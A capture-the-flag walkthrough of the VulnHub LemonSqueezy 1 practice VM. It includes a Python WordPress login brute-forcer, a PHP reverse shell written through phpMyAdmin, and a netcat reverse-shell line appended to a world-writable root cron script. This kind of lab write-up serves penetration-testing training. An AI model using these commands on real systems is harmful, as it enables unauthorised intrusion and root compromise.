---
title: VulnHub - LemonSqueezy 1
author: ret2x
date: 2021-10-24 20:11:15 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, sqli, wordpress]
image:
    path: /assets/images/lemonsqueezy/front.png
---

**Description:** A linux machine hosting a Wordpress CMS which is vulnerable to dictionary attack whose login revealed the password to access to phpMyAdmin, since MySQL has the File_priv permission enabled was possible to write a webshell to a web directory on the target host. The write permissions granted to a critical file enabled that a cron job execute a malicious instruction and thus gain root privileges.

**Author:** James Hay

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/lemonsqueezy-1,473/](https://www.vulnhub.com/entry/lemonsqueezy-1,473/)

## Information Gathering
### Host Discovery

With nmap I did a ping scan on the local network to detect the target machine.

```console
root@kali:~$ nmap -n -sn 192.168.179.1/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-24 17:57 -05
Nmap scan report for 192.168.179.158
Host is up (0.00061s latency).
MAC Address: 00:0C:29:E2:78:CF (VMware)
Nmap scan report for 192.168.179.254
Host is up (0.00016s latency).
MAC Address: 00:50:56:FA:F3:F9 (VMware)
Nmap scan report for 192.168.179.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.60 seconds
```

### Port Scanning

Then I performed a full TCP port scan to detect available ports.

```console
root@kali:~$ nmap -v -n -T5 --open -p- 192.168.179.158 -oG nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
80/tcp open  http
```

### Service Enumeration

With nmap I did service and OS detection, script scanning and traceroute on the target machine.

```console
root@kali:~$ nmap -n -v -p80 -A 192.168.179.158 -oN nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

## Web Enumeration

On web server it is observed the apache deafault web page.

![](/assets/images/lemonsqueezy/screenshot-1.png)

So I ran wfuzz to find hidden directories.

```console
root@kali:~$ wfuzz -c --hc 404  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.179.158/FUZZ
...
000000587:   301        9 L      28 W       322 Ch      "wordpress"  
000000730:   301        9 L      28 W       319 Ch      "manual"     
000001073:   301        9 L      28 W       323 Ch      "javascript"  
000010825:   301        9 L      28 W       323 Ch      "phpmyadmin"
```

In the wfuzz output we can see the wordpress directory, I accessed it but I had problems with the page resolution.

![](/assets/images/lemonsqueezy/screenshot-2.png)

In the page source I saw that's requesting a domain name, to solve the page resolution we need to add the ip address and that domain name in the system hosts file.

![](/assets/images/lemonsqueezy/screenshot-3.png)

```console
root@kali:~$ echo '192.168.179.158 lemonsqueezy' >> /etc/hosts
```

![](/assets/images/lemonsqueezy/screenshot-4.png)

Then I enumerated the wordpress CMS, found a writable web directory and two users.

```console
root@kali:~$ wpscan --url http://lemonsqueezy/wordpress/ -e vp,vt,u
...
[+] Upload directory has listing enabled: http://lemonsqueezy/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)                                      
 | Confidence: 100%
 ...
[i] User(s) Identified:

[+] lemon
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://lemonsqueezy/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] orange
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
...
```

I developed a python script to brute force the login page.

```python
#!/usr/bin/env python3

import requests
import os
import threading
from queue import Queue
from colorama import init,Fore

init()
green=Fore.GREEN
gray=Fore.LIGHTBLACK_EX
reset=Fore.RESET

url="http://lemonsqueezy/wordpress/wp-login.php"
user="orange"
print_lock=threading.Lock()

def bflogin(passwd):
    data={
            'log':user,
            'pwd':passwd,
            'wp-submit':'Log+In'
            }

    r=requests.post(url,data=data)

    if 'ERROR' not in r.text:
        with print_lock:
            print(f"{green}[+] Found: {passwd:20}{reset}")
            os._exit(1)
    else:
        with print_lock:
            print(f"{gray}[-] Password {passwd:15}{reset}", end='\r')

def threader():
    while True:
        worker=q.get()
        bflogin(worker)
        q.task_done()

q=Queue()

for x in range(10):
    t=threading.Thread(target=threader)
    t.daemon=True
    t.start()

wordlist=open("/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt").read().splitlines()

for p in wordlist:
    q.put(p)

q.join()
```

I ran the script, after a few seconds I found the password for the orange user, and logged in.

```console
root@kali:~$ python3 wpbforce.py
[+] Found: ginger
```

![](/assets/images/lemonsqueezy/screenshot-5.png)

In the posts I found a string, possibly a password.

![](/assets/images/lemonsqueezy/screenshot-6.png)

So I tried to log in to phpMyAdmin as the orange user with the password **n0t1n@w0rdl1st!**.

![](/assets/images/lemonsqueezy/screenshot-7.png)

I had successful access, so we can see the password hashes of wordpress and try to crack them.

![](/assets/images/lemonsqueezy/screenshot-8.png)

## Exploitation
### phpMyAdmin

I tried to write a file on the server in the wordpress uploads directory that I found previously, this is allow since this has write permissions, in this case was possible to write the phpinfo function.

![](/assets/images/lemonsqueezy/screenshot-9.png)

![](/assets/images/lemonsqueezy/screenshot-10.png)

I used a pentestmonkey php reverse shell, I changed the IP addres with the IP of the attacking machine and the port, then I encoded it to hexadecimal and wrote it in the uploads directory.

```console
root@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
root@kali:~$ sed -i 's/127.0.0.1/192.168.179.1/;s/1234/443/' shell.php 
root@kali:~$ xxd -ps shell.php | tr -d '\n' | xclip -sel c
```

![](/assets/images/lemonsqueezy/screenshot-11.png)


Then we need to set up a netcat listener and run the following curl instruction.

```console
root@kali:~$ curl -s http://lemonsqueezy/wordpress/wp-content/uploads/z.php
```

As we see I got a shell and upgraded it to a TTY shell.

```console
root@kali:~$ nc -vlnp 443                                               
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.158] 41036
Linux lemonsqueezy 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 GNU/Linux
 09:57:59 up  2:32,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@lemonsqueezy:/$
```

Listing the writable files, I found the logrotate python script, this removes the tmp directory, it also has write permissions for all users, I can use this script to elevate our privileges.

```console
www-data@lemonsqueezy:/$ find / -writable -type f 2>/dev/null | egrep -v 'proc|sys'
<-writable -type f 2>/dev/null | egrep -v 'proc|sys'
/var/lib/wordpress/wp-content/index.php
/etc/logrotate.d/logrotate
www-data@lemonsqueezy:/$ cat /etc/logrotate.d/logrotate
cat /etc/logrotate.d/logrotate
#!/usr/bin/env python
import os
import sys
try:
   os.system('rm -r /tmp/* ')
except:
    sys.exit()
www-data@lemonsqueezy:/$ ls -la /etc/logrotate.d/logrotate
ls -la /etc/logrotate.d/logrotate
-rwxrwxrwx 1 root root 101 Apr 26  2020 /etc/logrotate.d/logrotate
```

## Privilege Escalation 
### Cron Job

To get root I added a netcat reverse shell to logrotate script, started a netcat listener wait a minutes and I got a root shell.

```console
www-data@lemonsqueezy:/dev/shm$ echo 'os.system("nc 192.168.179.1 1331 -e /bin/bash ")' >> /etc/logrotate.d/logrotate

root@kali:~$ nc -vlnp 1331
listening on [any] 1331 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.158] 41410
id
uid=0(root) gid=0(root) groups=0(root)
script -qc /bin/bash /dev/null
root@lemonsqueezy:~# ls
ls
root.txt
root@lemonsqueezy:~# cat root.txt
cat root.txt
NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4=
```

